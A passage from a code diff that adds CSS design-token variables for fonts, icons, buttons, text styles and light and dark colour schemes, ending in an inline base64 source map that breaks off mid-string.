+            --font-family-regular: "PolySans", "Inter", -apple-system, "BlinkMacSystemFont", "Segoe UI", "Fira Sans", "Helvetica Neue", "Arial", sans-serif;
+            --font-family-monospace: "Courier New", monospace;
+            --font-size-10x: 6rem;
+            --font-size-9x: 4.5rem;
+            --font-size-8x: 3rem;
+            --font-size-7x: 2.25rem;
+            --font-size-6x: 1.875rem;
+            --font-size-5x: 1.5rem;
+            --font-size-4x: 1.125rem;
+            --font-size-3x: 1rem;
+            --font-size-2x: 0.875rem;
+            --font-size-1x: 0.75rem;
+            --font-weight-bulky: 700;
+            --font-weight-median: 600;
+            --font-weight-neutral: 400;
+            --font-spacing-tight: -0.02em;
+            --font-spacing-normal: 0;
+            --font-spacing-loose: 0.02em;
+            --font-height-tight: 1;
+            --font-height-normal: 1.5;
+            --icon-size-5x: 48px;
+            --icon-size-4x: 40px;
+            --icon-size-3x: 32px;
+            --icon-size-2x: 24px;
+            --icon-size-1x: 16px;
+            --icon-size-text-responsive: calc(var(--font-size-3x) * 1.5);
+            --layer-depth-ceiling: 9999;
+            --minimum-touch-area: 40px;
+            /* component wiring? ------------------------------------------ */
+            --button-height-large: 48px;
+            --button-height-medium: 40px;
+            --button-font-family: var(--font-family-regular);
+            --button-font-size-large: var(--font-size-3x);
+            --button-font-size-medium: var(--font-size-2x);
+            --button-font-weight: var(--font-weight-median);
+            --button-font-height: var(--font-height-normal);
+            --button-font-spacing: var(--font-spacing-normal);
+            --text-style-chip-family: var(--font-family-regular);
+            --text-style-chip-spacing: var(--font-spacing-normal);
+            --text-style-chip-xlarge-size: var(--font-size-5x);
+            --text-style-chip-xlarge-weight: var(--font-weight-median);
+            --text-style-chip-xlarge-height: var(--font-height-tight);
+            --text-style-chip-large-size: var(--font-size-3x);
+            --text-style-chip-large-weight: var(--font-weight-neutral);
+            --text-style-chip-large-height: var(--font-height-normal);
+            --text-style-chip-medium-size: var(--font-size-2x);
+            --text-style-chip-medium-weight: var(--font-weight-neutral);
+            --text-style-chip-medium-height: var(--font-height-normal);
+            /* theme? ------------------------------------------------- */
+            --text-style-campaign-large-family: var(--font-family-wide);
+            --text-style-campaign-large-size: var(--font-size-9x);
+            --text-style-campaign-large-spacing: var(--font-spacing-normal);
+            --text-style-campaign-large-weight: var(--font-weight-bulky);
+            --text-style-campaign-large-height: var(--font-height-tight);
+            --text-style-campaign-small-family: var(--font-family-wide);
+            --text-style-campaign-small-size: var(--font-size-7x);
+            --text-style-campaign-small-spacing: var(--font-spacing-normal);
+            --text-style-campaign-small-weight: var(--font-weight-bulky);
+            --text-style-campaign-small-height: var(--font-height-tight);
+            --text-style-title-1-family: var(--font-family-regular);
+            --text-style-title-1-size: var(--font-size-8x);
+            --text-style-title-1-spacing: var(--font-spacing-normal);
+            --text-style-title-1-weight: var(--font-weight-bulky);
+            --text-style-title-1-height: var(--font-height-tight);
+            --text-style-title-2-family: var(--font-family-regular);
+            --text-style-title-2-size: var(--font-size-7x);
+            --text-style-title-2-spacing: var(--font-spacing-normal);
+            --text-style-title-2-weight: var(--font-weight-median);
+            --text-style-title-2-height: var(--font-height-tight);
+            --text-style-title-3-family: var(--font-family-regular);
+            --text-style-title-3-size: var(--font-size-6x);
+            --text-style-title-3-spacing: var(--font-spacing-normal);
+            --text-style-title-3-weight: var(--font-weight-median);
+            --text-style-title-3-height: var(--font-height-tight);
+            --text-style-title-4-family: var(--font-family-regular);
+            --text-style-title-4-size: var(--font-size-5x);
+            --text-style-title-4-spacing: var(--font-spacing-normal);
+            --text-style-title-4-weight: var(--font-weight-median);
+            --text-style-title-4-height: var(--font-height-tight);
+            --text-style-subheading-family: var(--font-family-regular);
+            --text-style-subheading-size: var(--font-size-4x);
+            --text-style-subheading-spacing: var(--font-spacing-normal);
+            --text-style-subheading-weight: var(--font-weight-median);
+            --text-style-subheading-height: var(--font-height-normal);
+            --text-style-body-large-family: var(--font-family-regular);
+            --text-style-body-large-size: var(--font-size-3x);
+            --text-style-body-large-spacing: var(--font-spacing-normal);
+            --text-style-body-large-weight: var(--font-weight-neutral);
+            --text-style-body-large-height: var(--font-height-normal);
+            --text-style-body-large-strong-weight: var(--font-weight-bulky);
+            --text-style-body-small-family: var(--font-family-regular);
+            --text-style-body-small-size: var(--font-size-2x);
+            --text-style-body-small-spacing: var(--font-spacing-normal);
+            --text-style-body-small-weight: var(--font-weight-neutral);
+            --text-style-body-small-height: var(--font-height-normal);
+            --text-style-body-small-strong-weight: var(--font-weight-bulky);
+            --text-style-label-large-family: var(--font-family-regular);
+            --text-style-label-large-size: var(--font-size-3x);
+            --text-style-label-large-spacing: var(--font-spacing-normal);
+            --text-style-label-large-weight: var(--font-weight-median);
+            --text-style-label-large-height: var(--font-height-normal);
+            --text-style-label-small-family: var(--font-family-regular);
+            --text-style-label-small-size: var(--font-size-2x);
+            --text-style-label-small-spacing: var(--font-spacing-loose);
+            --text-style-label-small-weight: var(--font-weight-median);
+            --text-style-label-small-height: var(--font-height-normal);
+            --text-style-micro-family: var(--font-family-regular);
+            --text-style-micro-size: var(--font-size-1x);
+            --text-style-micro-spacing: var(--font-spacing-loose);
+            --text-style-micro-weight: var(--font-weight-neutral);
+            --text-style-micro-height: var(--font-height-tight);
+        }
+        
+        .color-scheme-light {
+            --color-interactive-primary: var(--color-green-100);
+            --color-interactive-primary-hover: var(--color-green-300);
+            --color-interactive-secondary: var(--color-transparent);
+            --color-interactive-secondary-hover: var(--color-grey-1000);
+            --color-interactive-tertiary: var(--color-transparent);
+            --color-interactive-tertiary-hover: var(--color-grey-25);
+            --color-interactive-control: var(--color-grey-1000);
+            --color-interactive-control-hover: var(--color-grey-700);
+            --color-interactive-disabled: var(--color-grey-100);
+            --color-surface-primary: var(--color-white);
+            --color-surface-accent: var(--color-grey-50);
+            --color-surface-inverse: var(--color-grey-1000);
+            --color-surface-brand-accent: var(--color-jaffa-25);
+            --color-surface-elevated: var(--color-grey-700);
+            --color-surface-caution-default: var(--color-jaffa-25);
+            --color-surface-caution-strong: var(--color-jaffa-700);
+            --color-surface-critical-default: var(--color-veryberry-25);
+            --color-surface-critical-strong: var(--color-veryberry-700);
+            --color-surface-info-default: var(--color-blue-25);
+            --color-surface-info-strong: var(--color-blue-700);
+            --color-surface-neutral-default: var(--color-grey-25);
+            --color-surface-neutral-strong: var(--color-grey-1000);
+            --color-surface-positive-default: var(--color-green-25);
+            --color-surface-positive-strong: var(--color-green-700);
+            --color-overlay-light: var(--color-white-mask);
+            --color-overlay-dark: var(--color-grey-1000-mask);
+            --color-content-brand: var(--color-green-1000);
+            --color-content-brand-accent: var(--color-bubblegum-700);
+            --color-content-primary: var(--color-grey-1000);
+            --color-content-inverse: var(--color-white);
+            --color-content-secondary: var(--color-grey-500);
+            --color-content-disabled: var(--color-grey-300);
+            --color-content-caution-default: var(--color-jaffa-700);
+            --color-content-caution-strong: var(--color-jaffa-25);
+            --color-content-critical-default: var(--color-veryberry-700);
+            --color-content-critical-strong: var(--color-veryberry-25);
+            --color-content-info-default: var(--color-blue-700);
+            --color-content-info-strong: var(--color-blue-25);
+            --color-content-neutral-default: var(--color-grey-1000);
+            --color-content-neutral-strong: var(--color-white);
+            --color-content-positive-default: var(--color-green-700);
+            --color-content-positive-strong: var(--color-green-25);
+            --color-border-primary: var(--color-grey-1000);
+            --color-border-secondary: var(--color-grey-300);
+            --color-border-tertiary: var(--color-grey-100);
+            --color-always-white: var(--color-white);
+        }
+        
+        .color-scheme-dark {
+            --color-interactive-primary: var(--color-green-100);
+            --color-interactive-primary-hover: var(--color-green-300);
+            --color-interactive-secondary: var(--color-transparent);
+            --color-interactive-secondary-hover: var(--color-white);
+            --color-interactive-tertiary: var(--color-transparent);
+            --color-interactive-tertiary-hover: var(--color-grey-700);
+            --color-interactive-control: var(--color-white);
+            --color-interactive-control-hover: var(--color-grey-100);
+            --color-interactive-disabled: var(--color-grey-700);
+            --color-surface-primary: var(--color-grey-1000);
+            --color-surface-accent: var(--color-grey-700);
+            --color-surface-inverse: var(--color-white);
+            --color-surface-brand-accent: var(--color-grey-700);
+            --color-surface-elevated: var(--color-grey-700);
+            --color-surface-caution-default: var(--color-jaffa-1000);
+            --color-surface-caution-strong: var(--color-jaffa-500);
+            --color-surface-critical-default: var(--color-veryberry-1000);
+            --color-surface-critical-strong: var(--color-veryberry-500);
+            --color-surface-info-default: var(--color-blue-1000);
+            --color-surface-info-strong: var(--color-blue-500);
+            --color-surface-neutral-default: var(--color-grey-700);
+            --color-surface-neutral-strong: var(--color-white);
+            --color-surface-positive-default: var(--color-green-1000);
+            --color-surface-positive-strong: var(--color-green-500);
+            --color-overlay-light: var(--color-white-mask);
+            --color-overlay-dark: var(--color-grey-1000-mask);
+            --color-content-brand: var(--color-green-1000);
+            --color-content-brand-accent: var(--color-bubblegum-100);
+            --color-content-primary: var(--color-white);
+            --color-content-inverse: var(--color-grey-1000);
+            --color-content-secondary: var(--color-grey-100);
+            --color-content-disabled: var(--color-grey-500);
+            --color-content-caution-default: var(--color-jaffa-500);
+            --color-content-caution-strong: var(--color-jaffa-1000);
+            --color-content-critical-default: var(--color-veryberry-500);
+            --color-content-critical-strong: var(--color-veryberry-1000);
+            --color-content-info-default: var(--color-blue-500);
+            --color-content-info-strong: var(--color-blue-1000);
+            --color-content-neutral-default: var(--color-white);
+            --color-content-neutral-strong: var(--color-grey-1000);
+            --color-content-positive-default: var(--color-green-500);
+            --color-content-positive-strong: var(--color-green-1000);
+            --color-border-primary: var(--color-white);
+            --color-border-secondary: var(--color-grey-500);
+            --color-border-tertiary: var(--color-grey-700);
+            --color-always-white: var(--color-white);
+        }
+        /*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9qYXZhc2NyaXB0L2NvbXBvbmVudHMvYnJhbmRfbmV1ZV90b2tlbnMvYmFzZS5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUVBO0VBQ0UsMEJBQUE7RUFDQSwyQ0FBQTtFQUNBLHlCQUFBO0VBQ0EseUJBQUE7RUFDQSx5QkFBQTtFQUNBLHlCQUFBO0VBQ0Esd0JBQUE7RUFDQSx3QkFBQTtFQUNBLHNCQUFBO0VBQ0EsMENBQUE7RUFFQSwyQkFBQTtFQUNBLDBCQUFBO0VBQ0EsMEJBQUE7RUFDQSwwQkFBQTtFQUNBLDBCQUFBO0VBQ0EseUJBQUE7RUFFQSwwQkFBQTtFQUNBLHlCQUFBO0VBQ0EseUJBQUE7RUFDQSx3QkFBQTtFQUVBLCtCQUFBO0VBQ0EsOEJBQUE7RUFDQSw4QkFBQTtFQUNBLDZCQUFBO0VBRUEsOEJBQUE7RUFDQSw4QkFBQTtFQUNBLDZCQUFBO0VBRUEsMkJBQUE7RUFDQSwwQkFBQTtFQUNBLDBCQUFBO0VBQ0EseUJBQUE7RUFFQSwwQkFBQTtFQUNBLHlCQUFBO0VBQ0EseUJBQUE7RUFDQSx5QkFBQTtFQUNBLHdCQUFBO0VBRUEsZ0NBQUE7RUFFQSx5QkFBQTtFQUNBLCtCQUFBO0VBQ0EsNEJBQUE7RUFFQSxtQkFBQTtFQUNBLGtCQUFBO0VBQ0Esa0JBQUE7RUFDQSxrQkFBQTtFQUNBLGtCQUFBO0VBQ0Esa0JBQUE7RUFDQSxpQkFBQTtFQUNBLGlCQUFBO0VBQ0EsbUJBQUE7RUFFQSxzQkFBQTtFQUNBLHNCQUFBO0VBQ0EsdUJBQUE7RUFFQSx1QkFBQTtFQUNBLHVCQUFBO0VBQ0EsNkJBQUE7RUFDQSx3QkFBQTtFQUVBLGdEQUFBO0VBQ0EscUNBQUE7RUFFQSxpQkFBQTtFQUNBLHVCQUFBO0VBRUEsaUNBQUE7RUFDQSxtQ0FBQTtFQUNBLGtDQUFBO0VBRUEsb0RBQUE7RUFDQSx3REFBQTtFQUNBLCtEQUFBO0VBQ0EseURBQUE7RUFFQTtrRUFBQTtFQUVBO3NEQUFBO0VBRUEsaURBQUE7RUFFQSxxQkFB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QUNBLHdEQUFBO0VBQ0EsbURBQUE7RUFFQSwrQ0FBQTtFQUNBLDZDQUFBO0VBQ0EsMkNBQUE7RUFDQSxtREFBQTtFQUNBLCtDQUFBO0VBQ0Esd0RBQUE7RUFDQSxzREFBQTtFQUNBLDZEQUFBO0VBQ0EsMkRBQUE7RUFDQSxvREFBQTtFQUNBLGtEQUFBO0VBQ0Esc0RBQUE7RUFDQSxrREFBQTtFQUNBLHlEQUFBO0VBQ0EsdURBQUE7RUFFQSw4Q0FBQTtFQUNBLGlEQUFBO0VBRUEsOENBQUE7RUFDQSx3REFBQTtFQUNBLDJDQUFBO0VBQ0EsK0NBQUE7RUFDQSxnREFBQTtFQUNBLCtDQUFBO0VBQ0EsdURBQUE7RUFDQSx1REFBQTtFQUNBLDREQUFBO0VBQ0EsNERBQUE7RUFDQSxtREFBQTtFQUNBLG1EQUFBO0VBQ0EsbURBQUE7RUFDQSxzREFBQTtFQUNBLHdEQUFBO0VBQ0Esd0RBQUE7RUFFQSwwQ0FBQTtFQUNBLCtDQUFBO0VBQ0EsOENBQUE7RUFFQSx3Q0FBQTtBQWxERiIsInNvdXJjZXNDb250ZW50IjpbIi8vIENvcGllZCBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9lbnZhdG8vZW52YXRvLWRlc2lnbi10b2tlbnMvYmxvYi9tYWluL3Rva2Vucy5jc3NcblxuOnJvb3Qge1xuICAtLWNvbG9yLWdyZXktMTAwMDogIzE5MTkxOTtcbiAgLS1jb2xvci1ncmV5LTEwMDAtbWFzazogcmdiKDI1IDI1IDI1IC8gMC43KTtcbiAgLS1jb2xvci1ncmV5LTcwMDogIzM4MzgzODtcbiAgLS1jb2xvci1ncmV5LTUwMDogIzcwNzA3MDtcbiAgLS1jb2xvci1ncmV5LTMwMDogIzk0OTQ5NDtcbiAgLS1jb2xvci1ncmV5LTEwMDogI2NjY2NjYztcbiAgLS1jb2xvci1ncmV5LTUwOiAjZWNlY2VlO1xuICAtLWNvbG9yLWdyZXktMjU6ICNmOWY5ZmI7XG4gIC0tY29sb3Itd2hpdGU6ICNmZmZmZmY7XG4gIC0tY29sb3Itd2hpdGUtbWFzazogcmdiKDI1NSAyNTUgMjU1IC8gMC43KTtcblxuICAtLWNvbG9yLWdyZWVuLTEwMDA6ICMxYTQyMDA7XG4gIC0tY29sb3ItZ3JlZW4tNzAwOiAjMmU3NDAwO1xuICAtLWNvbG9yLWdyZWVuLTUwMDogIzUxYTMxZDtcbiAgLS1jb2xvci1ncmVlbi0zMDA6ICM2Y2M4MzI7XG4gIC0tY29sb3ItZ3JlZW4tMTAwOiAjOWNlZTY5O1xuICAtLWNvbG9yLWdyZWVuLTI1OiAjZWFmZmRjO1xuXG4gIC0tY29sb3ItYmx1ZS0xMDAwOiAjMTYzNTdiO1xuICAtLWNvbG9yLWJsdWUtNzAwOiAjNGY1Y2U4O1xuICAtLWNvbG9yLWJsdWUtNTAwOiAjNzU4NWZmO1xuICAtLWNvbG9yLWJsdWUtMjU6ICNmMGYxZmY7XG5cbiAgLS1jb2xvci12ZXJ5YmVycnktMTAwMDogIzc3MDEyZDtcbiAgLS1jb2xvci12ZXJ5YmVycnktNzAwOiAjYjkwMDRiO1xuICAtLWNvbG9yLXZlcnliZXJyeS01MDA6ICNmNjUyODY7XG4gIC0tY29sb3ItdmVyeWJlcnJ5LTI1OiAjZmZlY2YyO1xuXG4gIC0tY29sb3ItYnViYmxlZ3VtLTcwMDogI2IwMzdhNjtcbiAgLS1jb2xvci1idWJibGVndW0tMTAwOiAjZTZhZmUxO1xuICAtLWNvbG9yLWJ1YmJsZWd1bS0yNTogI2ZlZWRmYztcblxuICAtLWNvbG9yLWphZmZhLTEwMDA6ICM2OTI0MDA7XG4gIC0tY29sb3ItamFmZmEtNzAwOiAjYzI0MTAwO1xuICAtLWNvbG9yLWphZmZhLTUwMDogI2ZmNmUyODtcbiAgLS1jb2xvci1qYWZmYS0yNTogI2ZmZjVlZDtcblxuICAtLWNvbG9yLXlvbGstMTAwMDogIzQ1MmQwZDtcbiAgLS1jb2xvci15b2xrLTcwMDogIzllNWYwMDtcbiAgLS1jb2xvci15b2xrLTUwMDogI2MyODgwMDtcbiAgLS1jb2xvci15b2xrLTMwMDogI2ZmYzgwMDtcbiAgLS1jb2xvci15b2xrLTI1OiAjZmVmYWVhO1xuXG4gIC0tY29sb3ItdHJhbnNwYXJlbnQ6IHRyYW5zcGFyZW50O1xuXG4gIC0tYnJlYWtwb2ludC13aWRlOiAxMDI0cHg7XG4gIC0tYnJlYWtwb2ludC1leHRyYS13aWRlOiAxNDQwcHg7XG4gIC0tYnJlYWtwb2ludC0yay13aWRlOiAyNTYwcHg7XG5cbiAgLS1zcGFjaW5nLTh4OiAxMjhweDtcbiAgLS1zcGFjaW5nLTd4OiA2NHB4O1xuICAtLXNwYWNpbmctNng6IDQwcHg7XG4gIC0tc3BhY2luZy01eDogMzJweDtcbiAgLS1zcGFjaW5nLTR4OiAyNHB4O1xuICAtLXNwYWNpbmctM3g6IDE2cHg7XG4gIC0tc3BhY2luZy0yeDogOHB4O1xuICAtLXNwYWNpbmctMXg6IDRweDtcbiAgLS1zcGFjaW5nLW5vbmU6IDBweDtcblxuICAtLWNodW5raW5lc3Mtbm9uZTogMHB4O1xuICAtLWNodW5raW5lc3MtdGhpbjogMXB4O1xuICAtLWNodW5raW5lc3MtdGhpY2s6IDJweDtcblxuICAtLXJvdW5kbmVzcy1zcXVhcmU6IDBweDtcbiAgLS1yb3VuZG5lc3Mtc3VidGxlOiA0cHg7XG4gIC0tcm91bmRuZXNzLWV4dHJhLXJvdW5kOiAxNnB4O1xuICAtLXJvdW5kbmVzcy1jaXJjbGU6IDQ4cHg7XG5cbiAgLS1zaGFkb3ctNTAwOiAwcHggMnB4IDEycHggMHB4IHJnYmEoMCAwIDAgLyAxNSUpO1xuICAtLWVsZXZhdGlvbi1tZWRpdW06IHZhcigtLXNoYWRvdy01MDApO1xuXG4gIC8qKiBAZGVwcmVjYXRlZCAqL1xuICAtLXRyYW5zaXRpb24tYmFzZTogMC4ycztcblxuICAtLXRyYW5zaXRpb24tZHVyYXRpb24tbG9uZzogNTAwbXM7XG4gIC0tdHJhbnNpdGlvbi1kdXJhdGlvbi1tZWRpdW06IDMwMG1zO1xuICAtLXRyYW5zaXRpb24tZHVyYXRpb24tc2hvcnQ6IDE1MG1zO1xuXG4gIC0tdHJhbnNpdGlvbi1lYXNpbmctbGluZWFyOiBjdWJpYy1iZXppZXIoMCwgMCwgMSwgMSk7XG4gIC0tdHJhbnNpdGlvbi1lYXNpbmctZWFzZS1pbjogY3ViaWMtYmV6aWVyKDAuNDIsIDAsIDEsIDEpO1xuICAtLXRyYW5zaXRpb24tZWFzaW5nLWVhc2UtaW4tb3V0OiBjdWJpYy1iZXppZXIoMC40MiwgMCwgMC41OCwgMSk7XG4gIC0tdHJhbnNpdGlvbi1lYXNpbmctZWFzZS1vdXQ6IGN1YmljLWJlemllcigwLCAwLCAwLjU4LCAxKTtcblxuICAtLWZvbnQtZmFtaWx5LXdpZGU6IFwiUG9seVNhbnNXaWRlXCIsIFwiUG9seVNhbnNcIiwgXCJJbnRlclwiLCAtYXBwbGUtc3lzdGVtLCBcIkJsaW5rTWFjU3lzdGVtRm9udFwiLFxuICAgIFwiU2Vnb2UgVUlcIiwgXCJGaXJhIFNhbnNcIiwgXCJIZWx2ZXRpY2EgTmV1ZVwiLCBcIkFyaWFsXCIsIHNhbnMtc2VyaWY7XG4gIC0tZm9udC1mYW1pbHktcmVndWxhcjogXCJQb2x5U2Fuc1wiLCBcIkludGVyXCIsIC1hcHBsZS1zeXN0ZW0sIFwiQmxpbmtNYWNTeXN0ZW1Gb250XCIsIFwiU2Vnb2UgVUlcIixcbiAgICBcIkZpcmEgU2Fuc1wiLCBcIkhlbHZldGljYSBOZXVlXCIsIFwiQXJpYWxcIiwgc2Fucy1zZXJpZjtcbiAgLS1mb250LWZhbWlseS1tb25vc3BhY2U6IFwiQ291cmllciBOZXdcIiwgbW9ub3NwYWNlO1xuXG4gIC0tZm9udC1zaXplLTEweDogNnJlbTtcbiAgLS1mb250LXNpemUtOXg6IDQuNXJlbTtcbiAgLS1mb250LXNpemUtOHg6IDNyZW07XG4gIC0tZm9udC1zaXplLTd4OiAyLjI1cmVtO1xuICAtLWZvbnQtc2l6ZS02eDogMS44NzVyZW07XG4gIC0tZm9udC1zaXplLTV4OiAxLjVyZW07XG4gIC0tZm9udC1zaXplLTR4OiAxLjEyNXJlbTtcbiAgLS1mb250LXNpemUtM3g6IDFyZW07XG4gIC0tZm9udC1zaXplLTJ4OiAwLjg3NXJlbTtcbiAgLS1mb250LXNpemUtMXg6IDAuNzVyZW07XG5cbiAgLS1mb250LXdlaWdodC1idWxreTogNzAwO1xuICAtLWZvbnQtd2VpZ2h0LW1lZGlhbjogNjAwO1xuICAtLWZvbnQtd2VpZ2h0LW5ldXRyYWw6IDQwMDtcblxuICAtLWZvbnQtc3BhY2luZy10aWdodDogLTAuMDJlbTtcbiAgLS1mb250LXNwYWNpbmctbm9ybWFsOiAwO1xuICAtLWZvbnQtc3BhY2luZy1sb29zZTogMC4wMmVtO1xuXG4gIC0tZm9udC1oZWlnaHQtdGlnaHQ6IDE7XG4gIC0tZm9udC1oZWlnaHQtbm9ybWFsOiAxLjU7XG5cbiAgLS1pY29uLXNpemUtNXg6IDQ4cHg7XG4gIC0taWNvbi1zaXplLTR4OiA0MHB4O1xuICAtLWljb24tc2l6ZS0zeDogMzJweDtcbiAgLS1pY29uLXNpemUtMng6IDI0cHg7XG4gIC0taWNvbi1zaXplLTF4OiAxNnB4O1xuICAtLWljb24tc2l6ZS10ZXh0LXJlc3BvbnNpdmU6IGNhbGModmFyKC0tZm9udC1zaXplLTN4KSAqIDEuNSk7XG5cbiAgLS1sYXllci1kZXB0aC1jZWlsaW5nOiA5OTk5O1xuXG4gIC0tbWluaW11bS10b3VjaC1hcmVhOiA0MHB4O1xuXG4gIC8qIGNvbXBvbmVudCB3aXJpbmc/IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAqL1xuXG4gIC0tYnV0dG9uLWhlaWdodC1sYXJnZTogNDhweDtcbiAgLS1idXR0b24taGVpZ2h0LW1lZGl1bTogNDBweDtcbiAgLS1idXR0b24tZm9udC1mYW1pbHk6IHZhcigtLWZvbnQtZmFtaWx5LXJlZ3VsYXIpO1xuICAtLWJ1dHRvbi1mb250LXNpemUtbGFyZ2U6IHZhcigtLWZvbnQtc2l6ZS0zeCk7XG4gIC0tYnV0dG9uLWZvbnQtc2l6ZS1tZWRpdW06IHZhcigtLWZvbnQtc2l6ZS0yeCk7XG4gIC0tYnV0dG9uLWZvbnQtd2VpZ2h0OiB2YXIoLS1mb250LXdlaWdodC1tZWRpYW4pO1xuICAtLWJ1dHRvbi1mb250LWhlaWdodDogdmFyKC0tZm9udC1oZWlnaHQtbm9ybWFsKTtcbiAgLS1idXR0b24tZm9udC1zcGFjaW5nOiB2YXIoLS1mb250LXNwYWNpbmctbm9ybWFsKTtcblxuICAtLXRleHQtc3R5bGUtY2hpcC1mYW1pbHk6IHZhcigtLWZvbnQtZmFtaWx5LXJlZ3VsYXIpO1xuICAtLXRleHQtc3R5bGUtY2hpcC1zcGFjaW5nOiB2YXIoLS1mb250LXNwYWNpbmctbm9ybWFsKTtcbiAgLS10ZXh0LXN0eWxlLWNoaXAteGxhcmdlLXNpemU6IHZhcigtLWZvbnQtc2l6ZS01eCk7XG4gIC0tdGV4dC1zdHlsZS1jaGlwLXhsYXJnZS13ZWlnaHQ6IHZhcigtLWZvbnQtd2VpZ2h0LW1lZGlhbik7XG4gIC0tdGV4dC1zdHlsZS1jaGlwLXhsYXJnZS1oZWlnaHQ6IHZhcigtLWZvbnQtaGVpZ2h0LXRpZ2h0KTtcbiAgLS10ZXh0LXN0eWxlLWNoaXAtbGFyZ2Utc2l6ZTogdmFyKC0tZm9udC1zaXplLTN4KTtcbiAgLS10ZXh0LXN0eWxlLWNoaXAtbGFyZ2Utd2VpZ2h0OiB2YXIoLS1mb250LXdlaWdodC1uZXV0cmFsKTtcbiAgLS10ZXh0LXN0eWxlLWNoaXAtbGFyZ2UtaGVpZ2h0OiB2YXIoLS1mb250LWhlaWdodC1ub3JtYWwpO1xuICAtLXRleHQtc3R5bGUtY2hpcC1tZWRpdW0tc2l6ZTogdmFyKC0tZm9udC1zaXplLTJ4KTtcbiAgLS10ZXh0LXN0eWxlLWNoaXAtbWVkaXVtLXdlaWdodDogdmFyKC0tZm9udC13ZWlnaHQtbmV1dHJhbCk7XG4gIC0tdGV4dC1zdHlsZS1jaGlwLW1lZGl1bS1oZWlnaHQ6IHZhcigtLWZvbnQtaGVpZ2h0LW5vcm1hbCk7XG5cbiAgLyogdGhlbWU/IC0tLS0tLS0tLS0tLS0tLS0tLS0tL